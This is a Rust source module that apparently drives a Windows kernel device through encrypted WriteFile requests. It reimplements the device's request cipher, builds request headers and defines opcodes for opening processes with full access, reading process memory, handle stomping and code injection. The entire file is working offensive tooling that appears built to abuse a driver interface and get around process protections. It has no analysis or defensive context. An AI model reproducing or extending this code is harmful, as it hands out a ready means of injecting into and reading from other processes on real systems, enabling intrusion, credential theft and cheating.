use std::ffi::c_void;
use windows::Win32::Storage::FileSystem::WriteFile;

pub const REQ_SZ:       usize = 1184;
pub const RESP_SZ:      usize = 786;
pub const SEED_KEY:     u32   = 0x41414141;
pub const MAGIC_XOR:    u32   = 0x70506202;
pub const OPCODE_OFF:   usize = 36;
pub const RESP_PTR_OFF: usize = 40;
pub const WBCC_OFF:     usize = 48;
pub const WBCC_LEN:     usize = 536;
pub const ARG_OFF:      usize = 584;

pub const CMD_REGISTER:     u32 = 777;
pub const CMD_FLAG_30:      u32 = 779;
pub const CMD_SET_FLAGS:    u32 = 775;
pub const CMD_OPEN_PROC:    u32 = 785;
pub const CMD_READ_MEM:     u32 = 787;
pub const CMD_QUERY_PROC:   u32 = 791;
pub const CMD_HANDLE_STOMP: u32 = 800;
pub const CMD_INJECT_INIT:  u32 = 801;
pub const CMD_INJECT:       u32 = 820;

pub const PROC_ALL_ACCESS:          u32   = 0x1FFFFF;
pub const PROCESS_HANDLE_INFORMATION: u32 = 51;
pub const HANDLE_ENTRY_SIZE:        usize = 40;

pub type Handle = isize;

fn encrypt(buf: &mut [u8]) {
    let sk = u32::from_le_bytes(buf[32..36].try_into().unwrap());
    let mut s: u32 = 1864026567u32.wrapping_sub(1640531535u32.wrapping_mul(sk ^ 0x7B85F243));
    for b in buf[36..].iter_mut() {
        s = 1664525u32.wrapping_mul(s).wrapping_add(1013904223);
        *b ^= ((s >> 23) & 0xFF) as u8;
    }
}

fn decrypt(buf: &mut [u8]) {
    let mut s: u32 = 1864026567u32
        .wrapping_sub(1640531535u32.wrapping_mul(SEED_KEY ^ 0x847A0DBC));
    for b in buf[36..].iter_mut() {
        s = 1664525u32.wrapping_mul(s).wrapping_add(1013904223);
        *b ^= ((s >> 23) & 0xFF) as u8;
    }
}

fn build_req(opcode: u32, resp_ptr: u64) -> [u8; REQ_SZ] {
    let mut req = [0u8; REQ_SZ];
    req[24..28].copy_from_slice(&(REQ_SZ as u32).to_le_bytes());
    req[28..32].copy_from_slice(&(MAGIC_XOR ^ SEED_KEY).to_le_bytes());
    req[32..36].copy_from_slice(&SEED_KEY.to_le_bytes());
    req[OPCODE_OFF..OPCODE_OFF+4].copy_from_slice(&opcode.to_le_bytes());
    req[RESP_PTR_OFF..RESP_PTR_OFF+8].copy_from_slice(&resp_ptr.to_le_bytes());
    req
}

pub fn make_wbcc(pe_base: u64) -> [u8; WBCC_LEN] {
    let mut b = [0u8; WBCC_LEN];
    b[0..4].copy_from_slice(b"WBCC");
    b[4..6].copy_from_slice(&(WBCC_LEN as u16).to_le_bytes());
    b[6..8].copy_from_slice(&1u16.to_le_bytes());
    b[16..24].copy_from_slice(&pe_base.to_le_bytes());
    b
}

pub fn send_cmd(
    dev: Handle,
    opcode: u32,
    wbcc: &[u8; WBCC_LEN],
    fill: impl FnOnce(&mut [u8]),
) -> (i32, u64) {
    let mut resp = vec![0u8; RESP_SZ];
    let mut req  = build_req(opcode, resp.as_ptr() as u64);
    req[WBCC_OFF..WBCC_OFF+WBCC_LEN].copy_from_slice(wbcc);
    fill(&mut req);
    encrypt(&mut req);
    let mut written = 0u32;
    unsafe {
        let h = windows::Win32::Foundation::HANDLE(dev as *mut c_void);
        WriteFile(h, Some(&req[..]), Some(&mut written), None).ok();
    }
    decrypt(&mut resp);
    let status = i32::from_le_bytes(resp[36..40].try_into().unwrap());
    let value  = u64::from_le_bytes(resp[40..48].try_into().unwrap());
    (status, value)
}
